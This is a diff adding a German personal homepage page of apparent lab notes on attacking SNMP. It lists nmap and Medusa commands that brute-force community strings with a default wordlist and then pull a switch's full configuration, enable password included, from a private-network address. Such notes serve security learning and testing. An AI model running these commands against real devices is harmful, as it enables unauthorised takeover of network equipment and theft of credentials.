@@ -1,0 +1,62 @@
+
+<!DOCTYPE html>
+<html lang="de">
+<head>
+        <meta charset="utf-8">
+        <title>Angriff</title>
+        <link rel="stylesheet" href="thomas.css" type="text/css" media="screen">
+	<link rel="icon" href="pics/thomas.jpg">
+</head>
+
+<body>
+   <div id="thepage">
+
+    <header>
+      <img src="pics/thomas.jpg" width="100">
+      <div class='firma'>THOMAS</div>
+      <p>Angriffe (SNMP)</p>
+    </header>
+
+
+    <nav>
+    <ul>
+        <li><a href="http://thomas.dimes.cc">Zurück</a></li>
+        <li><a href="mich.html">Persönliches</a></li>
+        <li><a href="hobbies.html">Hobbies</a></li>
+        <li><a href="salt.html">SALT</a></li>
+        <li><a href="pi.html">Pi</a></li>
+        <li><a href="rancher.html">Rancher ANL</a></li>
+        <li><a href="meta.html">Metasploit</a></li>
+        <li><a href="snmp.html">SNMP</a></li>
+        <li><a href="scripts/browser.php">Browser</a></li>
+        <li><a href="scripts/login.php">Login</a></li>
+    </nav>
+
+   <section id="content">
+        <h2>SNMP Attacke</h2>
+	<p>Tools/Angriff: "sudo nmap -sU -p161 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/wordlists/metasploit/snmp_default_pass.txt 192.168.1.5". Also Community String Brute Force mit der Worlistze snmp_default. Am Port 161. Oder mit Medusa: medusa -h 192.168.1.5 -U /usr/share/wordlists/metasploit/snmp_default_pass.txt -e s -M snmp. Was tun wir nun damit? Lesen wir Switch config aus… sudo nmap -sU -p161 --script snmp-ios-config --script-args creds.snmp=public 192.168.1.5. bzw. mit dem Credentials für private: sudo nmap -sU -p161 --script snmp-ios-config --script-args creds.snmp=private 192.168.1.5. Hier bekommt man die volle config mit enable password.</p>
+</section>
+
+
+<aside>
+        <h2>Bereiche</h2>
+        <li><a href="http://www.dimes.cc" class="class1">Home</a></li>
+        <li><a href="http://sara.dimes.cc" class="class1">Sara</a></li>
+        <li><a href="http://mona.dimes.cc" class="class1">Mona</a></li>
+        <li><a href="http://jana.dimes.cc" class="class1">Jana</a></li>
+        <h2>Haus</h2>
+        <li><a href="http://rancher.dimes.cc">Rancher</a></li>
+        <li><a href="http://uptime.dimes.cc">Uptime</a></li>
+        <li><a href="http://solr.dimes.cc">Solr</a></li>
+        <h2>Links</h2>
+        <li><a href="https://portal.noe.gv.at" class="class1">Portal</a></li>
+        <li><a href="https://portal-test.noe.gv.at" class="class1">Test Portal</a></li>
+        <li><a href="https://www.networkchuck.com" class="class1">Chuck</a></li>
+</aside>
+
+<footer>
+        <p>2023 | &copy; Thomas</p>
+</footer>
+</div>
+</body>
+</html>
